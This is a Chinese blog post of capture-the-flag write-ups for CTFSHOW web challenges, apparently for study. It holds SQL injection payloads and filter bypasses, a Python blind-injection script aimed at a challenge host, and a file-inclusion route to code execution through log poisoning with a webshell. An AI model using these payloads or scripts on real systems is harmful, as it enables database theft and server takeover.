<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="CTFSHOW第一部分web题wp整理">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFSHOW第一部分web题wp整理">
<meta property="og:url" content="https://guayu-kakeru.github.io/posts/3905.html">
<meta property="og:site_name" content="guayu-kakeru">
<meta property="og:description" content="CTFSHOW第一部分web题wp整理">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6279d0e0a243d4fe9780.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac627dd0e0a243d4fe9782.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6282d0e0a243d4fe9785.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac62c9d0e0a243d4fe979a.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac62cbd0e0a243d4fe979b.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac62cbd0e0a243d4fe979c.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6308d0e0a243d4fe979f.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6315d0e0a243d4fe97a2.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6315d0e0a243d4fe97a4.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6318d0e0a243d4fe97a5.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac634dd0e0a243d4fe97b2.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6350d0e0a243d4fe97b3.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6357d0e0a243d4fe97bb.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6359d0e0a243d4fe97be.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac635bd0e0a243d4fe97c1.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac63c7d0e0a243d4fe97f2.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac63c7d0e0a243d4fe97f2.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac63cdd0e0a243d4fe97f9.png">
<meta property="og:image" content="https://guayu-kakeru.github.io/CTFshow.assets/image-20250204223159587.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac63a3d0e0a243d4fe97df.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac65efd0e0a243d4fe9925.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac65f6d0e0a243d4fe9929.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6606d0e0a243d4fe992d.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac65fcd0e0a243d4fe992b.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac664cd0e0a243d4fe9949.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac664dd0e0a243d4fe994a.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac669fd0e0a243d4fe9960.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac66afd0e0a243d4fe996e.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6865d0e0a243d4fe9a42.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac67b0d0e0a243d4fe9a10.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6855d0e0a243d4fe9a3c.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6846d0e0a243d4fe9a38.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6867d0e0a243d4fe9a43.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac68c2d0e0a243d4fe9a4f.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac68c7d0e0a243d4fe9a50.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac68dbd0e0a243d4fe9a54.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac694bd0e0a243d4fe9a75.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6952d0e0a243d4fe9a77.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac694dd0e0a243d4fe9a76.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6997d0e0a243d4fe9a8d.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac698bd0e0a243d4fe9a8b.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6979d0e0a243d4fe9a80.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67ac6975d0e0a243d4fe9a7f.png">
<meta property="article:published_time" content="2025-02-12T08:51:23.000Z">
<meta property="article:modified_time" content="2025-02-12T10:29:41.025Z">
<meta property="article:author" content="guayu-kakeru">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67ac6279d0e0a243d4fe9780.png">

<link rel="canonical" href="https://guayu-kakeru.github.io/posts/3905.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CTFSHOW第一部分web题wp整理 | guayu-kakeru</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">guayu-kakeru</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/3905.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="guayu-kakeru">
      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="guayu-kakeru">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CTFSHOW第一部分web题wp整理
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-02-12 16:51:23 / 修改时间：18:29:41" itemprop="dateCreated datePublished" datetime="2025-02-12T16:51:23+08:00">2025-02-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
      
        <div class="out-img-topic">
          <img src="https://pic1.imgdb.cn/item/67ac75e7d0e0a243d4fe9ef6.png" class="img-topic">
        </div>
      
      
        <p>CTFSHOW第一部分web题wp整理</p>
<span id="more"></span>

<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>用户名和密码都是注入点<br>第一步：查询有几个字段： 1’ or 1&#x3D;1 orde by 3# （4就没有列数了 判断之后3列）<br>第二步： 发现回显位置： 1’ union select 1,2,3 #  回显2 说明回显位置在2<br>第三步： 查看数据表名称： 1’ union select 1,database(),3 #  得到web2<br>第四步： 得到数据表 1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); #</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**`group_concat(table_name)`**：`group_concat` 是一个 MySQL 内置的聚合函数，它将查询结果中的多个值连接成一个字符串。`table_name` 是 `information_schema.tables` 表中的列，存储了所有表的名字。</span><br><span class="line">**`table_schema`**：表示数据库的名称，即该表属于哪个数据库</span><br></pre></td></tr></table></figure></div>
<p>查到了有flag 和 user表<br>第五步： 查看列名 1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’flag’; #<br>（和上一步的区别就是用information_schema.后面的内容不一样） 发现只有flag这列<br>最后一步查询数据 1’ union selcet 1,group_concat(flag),3 from web2.flag; #  （用xx.xx 来访问数据库和表）<br> 或者1’ union select 1,(select flag from flag),3; #</p>
<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题面： <code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code><br>可以找到etc&#x2F;passwd<br>法一： 利用之前dc系列靶机的思路 利用访问记录文件 用bp抓包写入一句话木马 然后用蚁剑连接<br>先找到真实的相对路径  用bp<br><img src="https://pic1.imgdb.cn/item/67ac6279d0e0a243d4fe9780.png" alt="|325"><br>发现相对路径是三重<br>然后我们再用bp发一个请求<br>然后访问..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>这题和dc5那题不一样的是一句话木马要写在User-Agent那里  根据log文件回显内容来定<br><img src="https://pic1.imgdb.cn/item/67ac627dd0e0a243d4fe9782.png"><br>这里还因为ctfshow是https 所以还要修改这个其他设置<br>法二：利用php伪协议<br>&#x2F;?url&#x3D;php:&#x2F;&#x2F;input   php脚本可以直接读取POST请求中的原始数据<br><img src="https://pic1.imgdb.cn/item/67ac6282d0e0a243d4fe9785.png" alt="|650"><br>页面回显两个文件 进入查看flag</p>
<p>法二：sqlmap作弊  但是要花不少时间跑</p>
<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p><img src="https://pic1.imgdb.cn/item/67ac62c9d0e0a243d4fe979a.png"><br>输入常见的sql注入语句之后会出现sql inject error  测试之后发现了空格被过滤<br>可以用<code>/**/</code> 绕过  接着和常规sql注入一样<br><img src="https://pic1.imgdb.cn/item/67ac62cbd0e0a243d4fe979b.png" alt="|375"><br>过滤 or and xor not 绕过 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">and</span> = &amp;&amp; </span><br><span class="line"><span class="attr">or</span> = || </span><br><span class="line"><span class="attr">xor</span> = | <span class="comment"># 异或 </span></span><br><span class="line"><span class="attr">not</span> = !</span><br></pre></td></tr></table></figure></div>
<p>&#x3D;绕过    like  大小于号过滤   !&lt;&gt;(&lt;&gt;等价于！&#x3D;)</p>
<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p><img src="https://pic1.imgdb.cn/item/67ac62cbd0e0a243d4fe979c.png"></p>
<h2 id="基于布尔的sql注入"><a href="#基于布尔的sql注入" class="headerlink" title="基于布尔的sql注入"></a>基于布尔的sql注入</h2><p>先去看看过滤了哪些字符<br>逐个尝试字符 发现 ‘ 空格 +  and or union等等都给过滤了 但是select没有过滤  所以没有union页面的信息不能回显<br>怎么办呢？ 数据库内置函数 <code>ascii()</code> 和 <code>substr()</code> 是可以将我们查询的字符串每个字符提取出来<br>sql injection payload：  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=-1||ascii(substr((&#123;&#123;select查询结果字符串&#125;&#125;)/**/<span class="keyword">from</span>/**/&#123;&#123;提取子串位置&#125;&#125;/**/<span class="keyword">for</span>/**/1))=&#123;当前可能的字符ascii值&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里的大括号只是占位符 实际应用的时候替换成实际需要的字符串，<code>from &#123;&#123;提取子串位置&#125;&#125;</code> 表示从第几个字符开始。<code>for 1</code> 表示提取 1 个字符。<br>这样子如果||后面的内容是true的话页面会有内容  如果是false就没有内容<br>这样子就遍历子串的位置   根据相应长度，可以判断字符在这个位置的具体字符（只有和这个具体字符匹配才能回显）<br>假设可能字符有 <code>[a-z]|[A-Z]|[0-9]|&#123;_,-,+,\,,\&#123;,\&#125;&#125;</code>，那么每次尝试的可能字符有 97 种，因为要等服务器响应，所以算上延迟假设 0.5s。<br>通常一个 flag 的长度在 9 到 60，最坏时间要 <code>0.5*60*97=2910s</code>，所以还是要等很久，那么如何优化呢？<br>可以利用二分的思路</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>||ascii(substr((&#123;<span class="keyword">select</span>查询结果字符串&#125;)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>&#123;提取子串位置&#125;<span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&lt;=&#123;当前可能的字符ascii值&#125;</span><br></pre></td></tr></table></figure></div>
<p>运用二分查找可以，将查找 97 种的字符的平均次数降低为 6 次。因此再次计算最坏时间为 <code>0.5*60*6=180s</code>，当然实际情况会根据服务器响应速度降低很多。<br>编写py脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://390226a3-4612-416d-b31b-5f06c69cc09a.challenge.ctf.show/index.php?id=-1&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(<span class="keyword">mid</span>, <span class="built_in">num</span>):</span><br><span class="line">    sql = <span class="string">&quot;/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;:d&#125;/**/for/**/1))&lt;=&#123;:d&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">num</span>,<span class="keyword">mid</span>)</span><br><span class="line">    payload = url + sql</span><br><span class="line">    res = requests.<span class="built_in">get</span>(payload)</span><br><span class="line">    <span class="literal">return</span> <span class="string">&#x27;If&#x27;</span> <span class="keyword">in</span> res.<span class="keyword">text</span></span><br><span class="line"></span><br><span class="line">def bsearch(l, r, <span class="built_in">num</span>):</span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        <span class="keyword">mid</span> = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> check(<span class="keyword">mid</span>, <span class="built_in">num</span>): r = <span class="keyword">mid</span>    <span class="comment"># check()判断mid是否满足性质</span></span><br><span class="line">        <span class="keyword">else</span>: l = <span class="keyword">mid</span> + <span class="number">1</span></span><br><span class="line">    <span class="literal">return</span> l</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">num</span> <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r = <span class="number">130</span></span><br><span class="line">    res = bsearch(l, r, <span class="built_in">num</span>)</span><br><span class="line">    <span class="keyword">if</span> chr(res) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(res)</span><br><span class="line">    print(f<span class="string">&#x27;第&#123;num&#125;次遍历结果:&#123;flag&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>这里选择了！作为终止结束判断符的原因是 查询结果超出flag长度之后，数据库返回特殊字符<br>太nb了</p>
<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p><img src="https://pic1.imgdb.cn/item/67ac6308d0e0a243d4fe979f.png" alt="|475"><br>用bp爆破密码之后没有结果   进入robots.txt 界面  发现有一个index.phps界面<br>文件内容：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>在 mysql 内，用作布尔型判断时，以 1 开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password&#x3D;’ or ‘1xxxx’，那么就相当于 password&#x3D;’ or 1，所以返回值就是 true<br>md5 (‘ffifdyop’,true)&#x3D;’or’6xxxxxx  利用这个传入ffifdyop参数  在hackbar中输入password&#x3D;ffifdyop   解决</p>
<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p><img src="https://pic1.imgdb.cn/item/67ac6315d0e0a243d4fe97a2.png"><br>点击取消就自动下载附件了  代码审计题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>可以看到过滤可这些常用的sql注入语法<br>看看大佬的payload：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u<span class="attr">sername</span><span class="operator">=</span> admin&#x27;<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span>group<span class="comment">/**/</span>by<span class="comment">/**/</span>password<span class="comment">/**/</span><span class="keyword">with</span><span class="comment">/**/</span>rollup<span class="comment">/**/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>这里我们要学习sql语句中的group by  和 with rollup   来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/p/16097234.html">https://www.cnblogs.com/GTL-JU/p/16097234.html</a><br><code>GROUP BY</code> 函数 ：<br>    <code>GROUP BY</code> 函数用于对查询结果进行分类。它后面跟随的字段指定了分类的依据。<br>	例如： <code>sql SELECT student FROM students GROUP BY age; -- 按照年龄将学生分类</code><br><code>WITH ROLLUP</code> 函数:<br>	<code>WITH ROLLUP</code> 函数通常跟在 <code>GROUP BY</code> 函数后面，用于对分类后的数据进行汇总统计。它会在 <code>GROUP BY</code> 函数的基础上生成汇总行，通常是按各分类的统计数据进行合计。加入 <code>WITH ROLLUP</code> 后，结果中会出现一行 <code>password</code> 为 <code>NULL</code>。<br>只进行group by函数 ：<br><img src="https://pic1.imgdb.cn/item/67ac6315d0e0a243d4fe97a4.png"><br>和with rollup一起啊使用：<br><img src="https://pic1.imgdb.cn/item/67ac6318d0e0a243d4fe97a5.png"></p>
